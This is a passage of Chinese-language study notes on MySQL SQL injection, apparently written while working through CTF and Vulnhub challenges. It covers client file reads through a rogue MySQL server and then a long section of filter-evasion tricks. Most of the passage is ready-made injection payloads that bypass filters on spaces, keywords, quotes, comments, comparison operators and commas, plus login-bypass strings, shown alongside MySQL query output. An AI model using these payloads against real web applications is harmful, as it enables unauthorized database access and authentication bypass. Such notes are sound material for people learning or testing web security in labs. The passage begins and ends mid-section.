class="string">&#x27;D://test.txt&#x27;</span>));</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+</span></span><br><span class="line"><span class="operator">|</span> hex(load_file(<span class="string">&#x27;D://test.txt&#x27;</span>)) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">68656</span>C6C6F20776F726C64         <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></p>
<p>这个函数也受到[[#secure_file_priv]]的影响。</p>
<h3 id="rogue-mysql-server">3.11.2. Rogue-MySQL-Server</h3>
<blockquote>
<p>很抽象，没有遇到过</p>
</blockquote>
<p>伪造一个恶意的MySQL Server，利用<code>load data infile</code>这一语句的漏洞实现客户端任意文件读取。该语句的功能是：读取一个文件内容并插入到表中</p>
<p><code>load data infile</code>语句读取客户端文件的语法如下： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load data <span class="keyword">local</span> infile &quot;/tmp/test.csv&quot; <span class="keyword">into</span> <span class="keyword">table</span> test</span><br></pre></td></tr></table></figure></p>
<p>这一语句发送执行后，客户端和服务端正常的执行流程如下：</p>
<ol type="1">
<li>Client：我把我本地/tmp/test.csv的内容插入到 test 表中去</li>
<li>Server：请把你本地/tmp/test.csv的内容发送给我</li>
<li>Client：好的，这是我本地/tmp/test.csv的内容</li>
<li>Server：成功/失败</li>
</ol>
<p>正常情况下这个流程是没问题的，但问题在于客户端并不知道自己的上一条命令具体发送了什么，所以客户端第二次要发送什么文件完全取决于服务端，那我们只需要构造一个恶意的服务端，就可以非法拿到服务器上的任意文件</p>
<p>参考：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/BOHB-yunying/p/10820453.html">MySQL服务端恶意读取客户端文件漏洞 (DDCTF2019和国赛均涉及到这个漏洞) - yunying - 博客园</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/ls1120704214/article/details/88174003">MySQL服务端恶意读取客户端文件漏洞分析并使用Golang编写简易蜜罐_孤城浪子55555的博客-CSDN博客_mysql客户端漏洞</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/allyshka/Rogue-MySql-Server">GitHub - allyshka/Rogue-MySql-Server: MySQL fake server for read files of connected clients</a></li>
</ul>
<h1 id="bypass">4. Bypass</h1>
<h2 id="过滤空格">4.1. 过滤空格</h2>
<p>空格的url编码为: %20。可以利用一下字符的url编码绕过： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/**/替代空格 </span><br><span class="line">%09 TAB 键（水平）</span><br><span class="line">%0a 新建一行 </span><br><span class="line">%0c 新的一页 </span><br><span class="line">%0d return 功能 </span><br><span class="line">%0b TAB 键（垂直） </span><br><span class="line">%a0 空格 </span><br><span class="line">() 代替空格，在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。</span><br></pre></td></tr></table></figure></p>
<p>因为%a0的特性，在进行正则匹配时，匹配到它时是识别为中文字符的，所以不会被过滤掉，但是在进入SQL语句后，Mysql是不认中文字符的，所以直接当作空格处理，就这样，我们便达成了Bypass的目的，成功绕过空格+注释的过滤</p>
<p>利用括号绕过请看[[#1 6 括号的问题]]</p>
<h2 id="过滤关键字">4.2. 过滤关键字⭐</h2>
<h3 id="大小写绕过">4.2.1. 大小写绕过</h3>
<p>条件：后台过滤了一些关键词，但是大小写敏感。</p>
<p>一般payload： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; unIOn SeLecT 1,2,3,4,5#</span><br></pre></td></tr></table></figure></p>
<p>比如使用preg_match函数时没有加上/i，那么就是大小写敏感。</p>
<h3 id="双写绕过">4.2.2. 双写绕过</h3>
<p>条件：后台在找到过滤的关键词时，使用空内容代替。比如这么一个语句： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(blacklist, &#x27;&#x27;, payload);</span><br></pre></td></tr></table></figure></p>
<p>假设黑名单种过滤了select，如果payload中有selselectect，那么中间的select被过滤，用空内容代替，那么剩下select，这就实现了绕过。</p>
<h3 id="编码绕过">4.2.3. 编码绕过</h3>
<p>利用urlencode(), ascii(char), hex(), unicode()， char()等编码绕过。</p>
<p>就像[[#3 4 二次查询注入]]中提到的那样，将payload进行编码。</p>
<p>使用url编码的时候有时候需要双重编码。比如后台如果碰到 %27 就会当作单引号从而过滤，大那是如果我们进行双重编码，即 %2527 (%的url编码为 %25)，那么后台识别到的就是%2527，也就成功绕过。<strong>针对在过滤检查之前进行一次url解码的情况</strong>。</p>
<h3 id="过滤-if">4.2.4. 过滤 if</h3>
<p>如果if被过滤了，按照之前的描述，时间盲注将无法使用。但是事实真的是这样吗？其实可以这么做 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep(5*(condition))</span><br></pre></td></tr></table></figure></p>
<p>如果condition为真，那么此时执行sleep(5)，如果condition为假，此时执行sleep(0)。</p>
<h3 id="特殊字符代替绕过">4.2.5. 特殊字符代替绕过</h3>
<p>这种方法针对的是过滤了 or, and, xor。</p>
<p>or可以用 || 代替；</p>
<p>and 可以用 &amp;&amp; 代替；</p>
<p>xor 可以用 ^ 代替；</p>
<p>not 可以用 ! 代替；</p>
<h3 id="过滤-select">4.2.6. 过滤 select</h3>
<p>可以使用handler来查询数据，具体可以看[[#3 5 2 3 handler mysql专属]]</p>
<p>如果实在无法绕过，可以考虑堆叠注入。</p>
<h3 id="过滤了字符串截取函数">4.2.7. 过滤了字符串截取函数</h3>
<p>常用的substr(), substring(), mid()等被过滤了，可以使用：</p>
<ul>
<li>left(str, len)</li>
<li>right(str, len)</li>
</ul>
<p>利用方式： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. ?id=-1&#x27; or ascii(left(database(),1))=100#</span><br><span class="line">2. ?id=-1&#x27; or ascii(right(database(),1))=100# </span><br><span class="line">或者 ?id=-1&#x27; or ascii(right(reverse(database()),1))=100#  // reverse()是字符串倒置的作用</span><br></pre></td></tr></table></figure></p>
<h3 id="过滤-sleep">4.2.8. 过滤 sleep</h3>
<p>可以使用内置函数 benchmark() 绕过。</p>
<p>语法： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">benchmark(执行次数, 执行表达式)</span><br></pre></td></tr></table></figure></p>
<p>利用：多执行几次表达式就可以使返回时间延迟，因此可以用于时间盲注，只是此时时间不好控制，因为执行表达式的时间我们是不知道的。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">and</span> benchmark(<span class="number">1000000000</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">and</span> benchmark(<span class="number">1000000000</span>,<span class="number">1</span>);                                                                   <span class="operator">+</span><span class="comment">---+---+-------------------------------+                                                                           | 1 | 2 | 3 and benchmark(1000000000,1) |                                                                           +---+---+-------------------------------+                                                                           | 1 | 2 |                             0 |                                                                           +---+---+-------------------------------+                                                                           1 row in set (6.70 sec) </span></span><br></pre></td></tr></table></figure>
<h2 id="过滤单引号">4.3. 过滤单引号</h2>
<p>以[[11 Vulnhub Billu_b0x Writeup]]遇到的问题为例，关键源码如下： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=str_replace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,urldecode(<span class="variable">$_POST</span>[<span class="string">&#x27;un&#x27;</span>]));</span><br><span class="line"><span class="variable">$pass</span>=str_replace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,urldecode(<span class="variable">$_POST</span>[<span class="string">&#x27;ps&#x27;</span>]));</span><br><span class="line"><span class="variable">$run</span>=<span class="string">&#x27;select * from auth where  pass=\&#x27;&#x27;</span>.<span class="variable">$pass</span>.<span class="string">&#x27;\&#x27; and uname=\&#x27;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;\&#x27;&#x27;</span>;</span><br><span class="line">...</span><br><span class="line"><span class="comment"># 最后将$run带入数据库查询</span></span><br></pre></td></tr></table></figure></p>
<p>首先将 $run 那句代码简化一下： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span> auth where  pass=<span class="string">&#x27;$pass&#x27;</span> <span class="keyword">and</span> uname=<span class="string">&#x27;$uname&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p>可以利用反斜杠绕过，给出如下payload： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=or 1=1#&amp;pass=\</span><br></pre></td></tr></table></figure></p>
<p>将payload带入查询语句： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> auth <span class="keyword">where</span> pass<span class="operator">=</span><span class="string">&#x27;\&#x27;</span> <span class="keyword">and</span> uname<span class="operator">=</span><span class="string">&#x27;or 1=1#&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p>此时反斜杠将第二个单引号给转义了，因此它失去了单引号闭合的作用，仅仅当作一个字符，那么第一个单引号就会和第三个单引号闭合，构成<code>'\' and uname='</code>，所以最终的查询信息其实为： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> auth <span class="keyword">where</span> pass<span class="operator">=</span><span class="string">&#x27;[无所谓的内容]&#x27;</span><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure></p>
<h2 id="过滤注释符">4.4. 过滤注释符</h2>
<p>一般payload都会利用注释符注释掉后面的一堆内容： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; or 1=1#</span></span><br></pre></td></tr></table></figure></p>
<p>此时后台语句为：（假设） <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span># limit <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure></p>
<p>如果注释符被过滤，比如#和-，+都被过滤了。其实可以使用如下payload绕过： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. ?id=-1&#x27; or 1=1 or &#x27;1</span><br><span class="line">2. ?id=-1&#x27; or &#x27;1=1</span><br><span class="line">3. ?id=-1&#x27; union select 1,2,3,&#x27;4 # 在最后一个字段处添加单引号</span><br></pre></td></tr></table></figure></p>
<p>使后台语句变为： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>;</span><br><span class="line"><span class="number">2.</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;1=1&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>;</span><br><span class="line"><span class="number">3.</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;4&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<h2 id="过滤比较符">4.5. 过滤比较符</h2>
<h3 id="过滤">4.5.1. 过滤 =</h3>
<h4 id="like-绕过">4.5.1.1. like 绕过</h4>
<p>LIKE 操作符用于在 WHERE 子句中搜索列中的指定模式。</p>
<p>语法： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name  <span class="keyword">WHERE</span> column_name <span class="keyword">LIKE</span> <span class="keyword">pattern</span>;</span><br></pre></td></tr></table></figure></p>
<p>%为通配符。G%表示以字母G开始的字符，%G表示以字符G结尾的字符，%G% 表示包含G的字符。</p>
<p>payload： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; or 1 like 1#</span></span><br></pre></td></tr></table></figure></p>
<h4 id="in-绕过">4.5.1.2. in 绕过</h4>
<p>IN 操作符允许您在 WHERE 子句中规定多个值。</p>
<p>语法： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name <span class="keyword">WHERE</span> column_name <span class="keyword">IN</span> (value1,value2,...);</span><br></pre></td></tr></table></figure></p>
<p>payload: <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; or 1 in (1)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">或者</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span> <span class="keyword">in</span> (<span class="string">&#x27;1&#x27;</span>)#</span><br></pre></td></tr></table></figure></p>
<h4 id="regexp-绕过">4.5.1.3. regexp 绕过</h4>
<p>MySQL中使用 regexp 来进行正则表达式匹配。利用payload如下： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; or 1 regexp 1#</span></span><br></pre></td></tr></table></figure></p>
<p>结果： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span> regexp <span class="number">1</span>#;                                                                    <span class="operator">-</span><span class="operator">&gt;</span> ;                                                                                                                <span class="operator">+</span><span class="comment">------+----------+----------+--------+                                                                                 | id   | username | password | camp   |                                                                                 +------+----------+----------+--------+                                                                                 |    1 | admin    | admin    | admin  |                                                                                 |    2 | root     | root     | root   |                                                                                 |    3 | hdf      | hdf      | common |                                                                                 |    4 | xioazz   | xiozz    | common |                                                                                 |    5 | you      | you      | common |                                                                                 |    6 | run      | run      | common |                                                                                 +------+----------+----------+--------+                                                                                 6 rows in set (0.02 sec)</span></span><br></pre></td></tr></table></figure></p>
<h4 id="绕过">4.5.1.4. &lt;&gt; 绕过</h4>
<p>这里的意思并不是说使用2&gt;1这样的方法绕过，而是： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; or !(1&lt;&gt;1)#</span></span><br></pre></td></tr></table></figure></p>
<p>这是因为 &lt;&gt; 等价于 !=，因此 !(1&lt;&gt;1)就会等价于!(1!=1) -&gt; !0 -&gt; 1，因此最终结果为： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">or</span> <span class="operator">!</span>(<span class="number">1</span><span class="operator">&lt;&gt;</span><span class="number">1</span>)#;</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> ;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+--------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span> camp   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+--------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> admin    <span class="operator">|</span> admin    <span class="operator">|</span> admin  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span> root     <span class="operator">|</span> root     <span class="operator">|</span> root   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span> hdf      <span class="operator">|</span> hdf      <span class="operator">|</span> common <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">4</span> <span class="operator">|</span> xioazz   <span class="operator">|</span> xiozz    <span class="operator">|</span> common <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">5</span> <span class="operator">|</span> you      <span class="operator">|</span> you      <span class="operator">|</span> common <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">6</span> <span class="operator">|</span> run      <span class="operator">|</span> run      <span class="operator">|</span> common <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+--------+</span></span><br><span class="line"><span class="number">6</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></p>
<h3 id="过滤-1">4.5.2. 过滤 &gt;, &lt;</h3>
<h4 id="greatest-least绕过">4.5.2.1. greatest(), least()绕过</h4>
<p>如下常用payload： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; or ascii(substr(database(),1,1))&gt;100</span><br><span class="line">?id=-1&#x27; or ascii(substr(database(),1,1))&lt;128</span><br></pre></td></tr></table></figure></p>
<p>如果被禁用了 &gt;, &lt; 可以分别用greatest() 和 least() 代替。</p>
<p>语法： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">greatest(n1, n2, n3, ...) <span class="operator">-</span><span class="operator">&gt;</span> 返回最大值</span><br><span class="line">least(n1, n2, n3, ...) <span class="operator">-</span><span class="operator">&gt;</span> 返回最小值</span><br></pre></td></tr></table></figure></p>
<p>因此上述payload可以修改为： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; or greatest((ascii(substr(database(),1,1))),100)=100</span><br><span class="line">?id=-1&#x27; or least((ascii(substr(database(),1,1))),128)=128</span><br></pre></td></tr></table></figure></p>
<p>以第一句话为例解释：如果(ascii(substr(database(),1,1)))&gt;100, 那么作比较的就是greatest((&gt;100), 100) -&gt; (&gt;100) 就不会 = 100 ，也就是or后面就是0，因此页面错误显示；反之，如果(ascii(substr(database(),1,1)))&lt;=100，把么比较的就是 greatest((&lt;=100), 100) -&gt; 100 就 = 100 ，也就是or后面就是1，因此页面正确显示。</p>
<h4 id="strcmp绕过">4.5.2.2. strcmp()绕过</h4>
<p><strong>注意，该函数也可以在=被过滤时使用。</strong></p>
<p>语法： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strcmp(str1, str2)</span><br></pre></td></tr></table></figure></p>
<p>作用：如果str1和str2一样，则返回0；如果str1小于str2，则返回-1；否则返回1。这里的比较字符串用的是ASCII码，一个一个字符的比较。如果str1是str2的真子串，即str1 &lt; str2，相反，str2是str1的真子串，则str1 &gt; str2。</p>
<p>常规payload可以修改为： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; or strcmp((ascii(substr(database(),1,1))), 100)</span><br></pre></td></tr></table></figure></p>
<p>我觉得这个函数用来绕过=被过滤会更好。</p>
<h4 id="between-and-绕过">4.5.2.3. between and 绕过</h4>
<p>语法： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">between</span> value1 <span class="keyword">and</span> value2</span><br></pre></td></tr></table></figure></p>
<p>作用：选取介于两个值之间的数据范围内的值。这些值可以是数值、文本或者日期。注意，两边都是闭区间，即<code>[value1, value2]</code>。</p>
<p>利用payload： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; or substr(database(),1,1) between &#x27;t&#x27; and &#x27;t&#x27;;</span><br></pre></td></tr></table></figure></p>
<p>结果： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">or</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">between</span> <span class="string">&#x27;t&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;t&#x27;</span>#;                           <span class="operator">-</span><span class="operator">&gt;</span> ;                                                                                                               <span class="operator">+</span><span class="comment">------+----------+----------+--------+                                                                             | id   | username | password | camp   |                                                                             +------+----------+----------+--------+                                                                             |    1 | admin    | admin    | admin  |                                                                              |    2 | root     | root     | root   |                                                                             |    3 | hdf      | hdf      | common |                                                                              |    4 | xioazz   | xiozz    | common |                                                                              |    5 | you      | you      | common |                                                                              |    6 | run      | run      | common |                                                                              +------+----------+----------+--------+                                                                              6 rows in set (0.00 sec) </span></span><br></pre></td></tr></table></figure></p>
<p>感觉绕过=被过滤更好用。</p>
<h2 id="过滤逗号">4.6. 过滤逗号</h2>
<p>常用的payload中关于字符串截取的时候经常用到都好，比如substr(database(),1,1)。如果逗号被过滤了，可以使用: str from pos for len <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">substr(database() from 1 for 1)</span><br><span class="line">mid(string from start for length)</span><br><span class="line">mid(string from start) &lt;=&gt; mid(string, start) # 获取从start位置到结束的字符串</span><br></pre></td></tr></table></figure></p>
<p>还可以利用like绕过，比如上面的语句可以这么写： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">database() like &#x27;t%&#x27; # 这个结果可能为1，也可能为0，看这怎么利用了</span><br></pre></td></tr></table></figure></p>
<p>这个结果可能为1，也可能为0，看这怎么利用了</p>
<p>limit pos,len 可以写为 limit len offset pos (pos从0开始)</p>
<p>还可以使用join绕过： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)c; 就会等价于 <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span>(<span class="keyword">select</span> <span class="number">2</span>)b <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)c <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">4</span>)d;                                                                                                               <span class="operator">+</span><span class="comment">------+----------+----------+------+                                                                               | id   | username | password | camp |                                                                               +------+----------+----------+------+                                                                               |    1 | 2        | 3        | 4    |                                                                                  +------+----------+----------+------+                                                                                   1 row in set (0.00 sec) </span></span><br></pre></td></tr></table></figure></p>
<h1 id="遇到的问题">5. 遇到的问题</h1>
<h2 id="mysql查询技巧绕过强类型比较">5.1. MySQL查询技巧绕过强类型比较</h2>
<p>题目：[[bugku_login2]]</p>
<p>MySQL中联合查询时候返回的值我们是能够控制的，比如常规的 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; unnion select 1,2,3,4;</span><br></pre></td></tr></table></figure></p>
<p>那么返回的值就是1，2，3，4。我们可以通过修改1，2，3，4位置上的值从而控制返回的信息。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,md5(<span class="number">123</span>),<span class="number">3</span>,<span class="number">4</span>;                                                 <span class="operator">+</span><span class="comment">------+----------------------------------+----------+------+                                                       | id   | username                         | password | camp |                                                       +------+----------------------------------+----------+------+                                                       |    1 | 202cb962ac59075b964b07152d234b70 | 3        | 4    |                                                       +------+----------------------------------+----------+------+                                                       1 row in set (0.00 sec) </span></span><br></pre></td></tr></table></figure>
<p>如果后台语句如下： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT username,password FROM admin WHERE username=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$row</span>) &amp;&amp; <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>]===md5(<span class="variable">$password</span>))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>从中可以看到返回的字段数为2，并且如果返回不为空，那么就进行强类型比较。在这题中，我们肯定不知道密码是多少，所以只能通过联合查询控制返回的password字段的值为MD5($password)即可。</p>
<p>即，返回的结果为：</p>
<table>
<thead>
<tr class="header">
<th>username</th>
<th>password</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>任意</td>
<td>md5($password)</td>
</tr>
</tbody>
</table>
<p>其中$password是我们在输入的。因此，payload如下 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&#x27; union select 1,md5(123)#&amp;password=123</span><br></pre></td></tr></table></figure></p>
<p>就可以成功绕过强类型比较。</p>
<h2 id="mysql中字符串和数字比较特性">5.2. MySQL中字符串和数字比较特性</h2>
<h3 id="原理-3">5.2.1. 原理</h3>
<p>首先，将首字符不为数字的字符串转为0，不管多长的字符串都会被转为0，然后再跟数字进行比较。注意，如果首字符为数字，或者前几个字符都为数字，则整个字符串会被转为开头连续的几个数字，直到碰到非数字。比如<code>123str</code>就会被转为<code>123</code>，更甚<code>0123str</code>也会被转为<code>123</code>。</p>
<ol type="1">
